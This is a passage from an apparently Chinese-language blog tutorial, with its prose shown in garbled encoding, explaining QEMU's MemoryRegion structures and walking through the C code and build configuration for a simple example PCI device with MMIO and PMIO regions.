class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                       struct MemoryRegion<br>                       +------------------------+                                         <br>                       |<span class="hljs-string">name                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                                  </span>|<br>                                  |<span class="hljs-string"></span><br><span class="hljs-string">          ----+-------------------+---------------------+----</span><br><span class="hljs-string">              </span>|<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br><br>struct MemoryRegion                            struct MemoryRegion<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">name                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">name                    </span>|<br>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (const char *)        </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">addr                    </span>|<br>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (hwaddr)              </span>|<br>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">size                    </span>|<br>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (Int128)              </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">subregions              </span>|<br>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<br>+------------------------+                     +------------------------+<br></code></pre></td></tr></table></figure><p>ç›¸åº”åœ°ï¼ŒåŸºäº OOP çš„æ€æƒ³ï¼ŒMemoryRegion çš„æˆå‘˜å‡½æ•°è¢«å°è£…åœ¨å‡½æ•°è¡¨ <code>MemoryRegionOps</code> å½“ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Memory region callbacks</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegionOps</span> &#123;</span><br>    <span class="hljs-comment">/* ä»å†…å­˜åŒºåŸŸä¸Šè¯». @addr ä¸ @mr æœ‰å…³; @size å•ä½ä¸ºå­—èŠ‚. */</span><br>    <span class="hljs-type">uint64_t</span> (*read)(<span class="hljs-type">void</span> *opaque,<br>                     hwaddr addr,<br>                     <span class="hljs-type">unsigned</span> size);<br>    <span class="hljs-comment">/* å¾€å†…å­˜åŒºåŸŸä¸Šå†™. @addr ä¸ @mr æœ‰å…³; @size å•ä½ä¸ºå­—èŠ‚. */</span><br>    <span class="hljs-type">void</span> (*write)(<span class="hljs-type">void</span> *opaque,<br>                  hwaddr addr,<br>                  <span class="hljs-type">uint64_t</span> data,<br>                  <span class="hljs-type">unsigned</span> size);<br><br>    MemTxResult (*read_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                   hwaddr addr,<br>                                   <span class="hljs-type">uint64_t</span> *data,<br>                                   <span class="hljs-type">unsigned</span> size,<br>                                   MemTxAttrs attrs);<br>    MemTxResult (*write_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                    hwaddr addr,<br>                                    <span class="hljs-type">uint64_t</span> data,<br>                                    <span class="hljs-type">unsigned</span> size,<br>                                    MemTxAttrs attrs);<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">device_endian</span> <span class="hljs-title">endianness</span>;</span><br>    <span class="hljs-comment">/* Guestå¯è§çº¦æŸ: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* è‹¥é 0ï¼Œåˆ™æŒ‡å®šäº†è¶…å‡ºæœºå™¨æ£€æŸ¥èŒƒå›´çš„è®¿é—®å¤§å°ç•Œé™</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span><br><span class="hljs-comment">         * accesses throw machine checks.</span><br><span class="hljs-comment">         */</span><br>         <span class="hljs-type">bool</span> unaligned;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * è‹¥å­˜åœ¨ä¸” #false, åˆ™è¯¥äº‹åŠ¡ä¸ä¼šè¢«è®¾å¤‡æ‰€æ¥å—</span><br><span class="hljs-comment">         * (å¹¶å¯¼è‡´æœºå™¨çš„ç›¸å…³è¡Œä¸ºï¼Œä¾‹å¦‚æœºå™¨æ£€æŸ¥å¼‚å¸¸).</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> (*accepts)(<span class="hljs-type">void</span> *opaque, hwaddr addr,<br>                        <span class="hljs-type">unsigned</span> size, <span class="hljs-type">bool</span> is_write,<br>                        MemTxAttrs attrs);<br>    &#125; valid;<br>    <span class="hljs-comment">/* å†…éƒ¨åº”ç”¨çº¦æŸ: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* è‹¥é 0ï¼Œåˆ™å†³å®šäº†æœ€å°çš„å®ç°çš„ size .</span><br><span class="hljs-comment">         * æ›´å°çš„ size å°†è¢«å‘ä¸Šå›ç»•ï¼Œä¸”å°†è¿”å›éƒ¨åˆ†ç»“æœ.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-comment">/* è‹¥é 0ï¼Œåˆ™å†³å®šäº†æœ€å¤§çš„å®ç°çš„ size . </span><br><span class="hljs-comment">         * æ›´å¤§çš„ size å°†è¢«ä½œä¸ºä¸€ç³»åˆ—çš„æ›´å°çš„ size çš„è®¿é—®è€Œå®Œæˆ.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* è‹¥ä¸º true, æ”¯æŒéå¯¹é½çš„è®¿é—®.  </span><br><span class="hljs-comment">         * å¦åˆ™æ‰€æœ‰çš„è®¿é—®éƒ½å°†è¢«è½¬æ¢ä¸ºï¼ˆå¯èƒ½å¤šç§ï¼‰å¯¹é½çš„è®¿é—®.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> unaligned;<br>    &#125; impl;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çš„ Guest è¦è¯»å†™è™šæ‹Ÿæœºä¸Šçš„å†…å­˜æ—¶ï¼Œåœ¨ Qemu å†…éƒ¨å®é™…ä¸Šä¼šè°ƒç”¨ <code>address_space_rw()</code>ï¼Œå¯¹äºä¸€èˆ¬çš„ RAM å†…å­˜è€Œè¨€åˆ™ç›´æ¥å¯¹ MR å¯¹åº”çš„å†…å­˜è¿›è¡Œæ“ä½œï¼Œå¯¹äº MMIO è€Œè¨€åˆ™æœ€ç»ˆè°ƒç”¨åˆ°å¯¹åº”çš„ <code>MR-&gt;ops-&gt;read()</code> æˆ– <code>MR-&gt;ops-&gt;write()</code></p><p>å…³äº Qemu å†…å­˜ç®¡ç†æ›´å¤šçš„å†…å®¹å°±æš‚ä¸”ä¸åœ¨æ­¤å±•å¼€äº†ï¼Œä¸è¿‡ç°åœ¨æˆ‘ä»¬çŸ¥é“çš„æ˜¯åœ¨ Qemu ä¸­ä½¿ç”¨ <code>MemoryRegion</code> ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€æ®µå†…å­˜åŒºåŸŸï¼Œ<strong>é‚£ä¹ˆæˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡åœ¨è®¾å¤‡ä¸­æ·»åŠ  MemoryRegion çš„æ–¹å¼æ¥ä¸ºè®¾å¤‡æ·»åŠ å†…å­˜ï¼Œä»è€Œå®ç°ä¸è®¾å¤‡é—´çš„ MMIO é€šä¿¡</strong></p><p>åŒæ ·çš„ï¼Œä¸ºäº†ç»Ÿä¸€æ¥å£ï¼Œåœ¨ Qemu å½“ä¸­ <strong>PMIO çš„å®ç°åŒæ ·æ˜¯é€šè¿‡ MemoryRegion æ¥å®Œæˆçš„</strong></p><h2 id="ä¸‰ã€Qemu-ä¸­-PCI-è®¾å¤‡çš„ç¼–å†™"><a href="#ä¸‰ã€Qemu-ä¸­-PCI-è®¾å¤‡çš„ç¼–å†™" class="headerlink" title="ä¸‰ã€Qemu ä¸­ PCI è®¾å¤‡çš„ç¼–å†™"></a>ä¸‰ã€Qemu ä¸­ PCI è®¾å¤‡çš„ç¼–å†™</h2><p>åœ¨è¡¥å……äº†è¿™ä¹ˆå¤šçš„ Qemu ç›¸å…³çš„çŸ¥è¯†ä¹‹åï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹åœ¨ Qemu ä¸­ç¼–å†™ PCI è®¾å¤‡äº†ï¼Œè¿™é‡Œç¬”è€…å°†ç¼–å†™ä¸€ä¸ªæœ€ç®€å•çš„ Qemu è®¾å¤‡ï¼Œå¹¶å°†æºç æ”¾åœ¨ <code>hw/misc/a3dev.c</code> ä¸­</p><p>Qemu å½“ä¸­ PCI è®¾å¤‡å®ä¾‹çš„åŸºç±»æ˜¯ <code>PCIDevice</code>ï¼Œå› æ­¤æˆ‘ä»¬åº”å½“åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª <code>PCIDevice</code> çš„ç±»æ¥è¡¨ç¤ºæˆ‘ä»¬çš„è®¾å¤‡å®ä¾‹ï¼Œè¿™é‡Œç¬”è€…ä»…å£°æ˜äº†ä¸¤ä¸ª <code>MemoryRegion</code> ç”¨ä½œ MMIO ä¸ PMIOï¼Œä»¥åŠä¸€ä¸ªç”¨ä½œæ•°æ®å­˜å‚¨çš„ bufferï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_BUF_SIZE 0x100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint8_t</span> buf[A3DEV_BUF_SIZE];<br>&#125; A3PCIDevState;<br></code></pre></td></tr></table></figure><p>ä»¥åŠå®šä¹‰ä¸€ä¸ªç©ºçš„ Class æ¨¡æ¿ï¼Œç»§æ‰¿è‡ª PCI è®¾å¤‡çš„é™æ€ç±»å‹ <code>PCIDeviceClass</code>ï¼Œä¸è¿‡è¿™ä¸€æ­¥å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œäº‹å®ä¸Šæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ <code>PCIDeviceClass</code> ä½œä¸ºæˆ‘ä»¬è®¾å¤‡ç±»çš„ Classï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br></code></pre></td></tr></table></figure><p>ä»¥åŠä¸¤ä¸ªå°†çˆ¶ç±»è½¬ä¸ºå­ç±»çš„å®ï¼Œå› ä¸º QOM åŸºæœ¬å‡½æ•°ä¼ é€’çš„å¤§éƒ½æ˜¯çˆ¶ç±»æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå®æ¥è¿›è¡Œç±»å‹æ£€æŸ¥ + è½¬å‹ï¼Œè¿™ä¹Ÿæ˜¯ Qemu ä¸­æƒ¯ç”¨çš„åšæ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬å¼€å§‹å®šä¹‰ MMIO ä¸ PMIO çš„æ“ä½œå‡½æ•°ï¼Œè¿™é‡Œç¬”è€…å°±ç®€å•åœ°è®¾ç½®ä¸ºè¯»å†™è®¾å¤‡å†…éƒ¨çš„ bufferï¼Œå¹¶å£°æ˜ä¸Šä¸¤ä¸ª MemoryRegion å¯¹åº”çš„å‡½æ•°è¡¨ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä¼ å…¥çš„ <code>hwaddr</code> ç±»å‹å‚æ•°å…¶å®ä¸ºç›¸å¯¹åœ°å€è€Œéç»å¯¹åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br>    <span class="hljs-type">uint64_t</span> val = ~<span class="hljs-number">0LL</span>;<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> val;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> val;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;val, &amp;ds-&gt;buf[addr], size);<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> ;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> ;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;ds-&gt;buf[addr], &amp;val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    a3dev_write(opaque, addr, val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯è®¾å¤‡å®ä¾‹çš„åˆå§‹åŒ–å‡½æ•°ï¼Œåœ¨ <code>PCIDeviceClass</code> å½“ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>realize</code> çš„å‡½æ•°æŒ‡é’ˆï¼Œå½“ PCI è®¾å¤‡è¢«è½½å…¥æ—¶ä¾¿ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°æ¥åˆå§‹åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¹Ÿå®šä¹‰ä¸€ä¸ªè‡ªå·±çš„åˆå§‹åŒ–å‡½æ•°ï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦åšçš„å·¥ä½œå…¶å®åŸºæœ¬ä¸Šå°±åªæœ‰åˆå§‹åŒ–ä¸¤ä¸ª <code>MemoryRegion</code>ï¼Œ<code>memory_region_init_io()</code> ä¼šä¸ºè¿™ä¸¤ä¸ª <code>MemoryRegion</code> è¿›è¡Œåˆå§‹åŒ–çš„å·¥ä½œï¼Œå¹¶è®¾ç½®å‡½æ•°è¡¨ä¸ºæˆ‘ä»¬æŒ‡å®šçš„å‡½æ•°è¡¨ï¼Œ<code>pci_register_bar()</code> åˆ™ç”¨æ¥æ³¨å†Œ BARï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_BUF_SIZE);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ Class ä¸ Objectï¼ˆä¹Ÿå°±æ˜¯ instanceï¼‰çš„åˆå§‹åŒ–å‡½æ•°ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨ Class çš„åˆå§‹åŒ–å‡½æ•°ä¸­æˆ‘ä»¬åº”å½“è®¾ç½®çˆ¶ç±» <code>PCIDeviceClass</code> çš„ä¸€ç³»åˆ—åŸºæœ¬å±æ€§ï¼ˆä¹Ÿå°±æ˜¯ PCI è®¾å¤‡çš„åŸºæœ¬å±æ€§ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯ä¸ºæˆ‘ä»¬çš„ PCI è®¾å¤‡ç±»å‹æ³¨å†Œ TypeInfo äº†ï¼Œè¿™é‡Œåˆ«å¿˜äº†<strong>æˆ‘ä»¬çš„æ¥å£ä¸­åº”å½“å¢åŠ ä¸Š PCI çš„æ¥å£</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åœ¨ meson æ„å»ºç³»ç»Ÿä¸­åŠ å…¥æˆ‘ä»¬æ–°å¢çš„è¿™ä¸ªè®¾å¤‡ï¼Œåœ¨ <code>hw/misc/meson.build</code> ä¸­åŠ å…¥å¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs meson">softmmu_ss.add(when: &#x27;CONFIG_PCI_A3DEV&#x27;, if_true: files(&#x27;a3dev.c&#x27;))<br></code></pre></td></tr></table></figure><p>å¹¶åœ¨ <code>hw/misc/Kconfig</code> ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œè¿™è¡¨ç¤ºæˆ‘ä»¬çš„è®¾å¤‡ä¼šåœ¨ <code>CONFIG_PCI_DEVICES=y</code> æ—¶ç¼–è¯‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config PCI_A3DEV<br>    bool<br>    default y if PCI_DEVICES<br>    depends on 